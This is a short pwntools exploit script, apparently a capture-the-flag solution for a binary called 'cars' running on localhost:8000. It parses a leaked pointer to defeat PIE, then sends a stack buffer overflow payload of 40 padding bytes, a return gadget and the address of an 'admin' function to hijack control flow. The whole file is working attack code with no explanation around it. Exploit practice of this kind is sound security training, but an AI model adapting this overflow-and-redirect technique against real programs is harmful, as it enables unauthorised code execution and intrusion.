from pwn import *

# context.terminal = ['st']

elf = ELF("./cars")
# io = process(elf.path)
io = remote("localhost", 8000)

# gdb.attach(io, gdbscript="b *file_report+96")

payload = b"A"*(40)

io.recvuntil(b"#")
leak = int(io.recvuntil(b"\n")[:-1].decode())
pie_base = leak - 0x4090
print(hex(pie_base))
elf.address = pie_base

admin = p64(elf.sym.admin)
payload += p64(pie_base + 0x101a)
payload += admin

io.sendline(b"amongus")
io.sendline(payload)

io.recvline()

print(io.recvline())
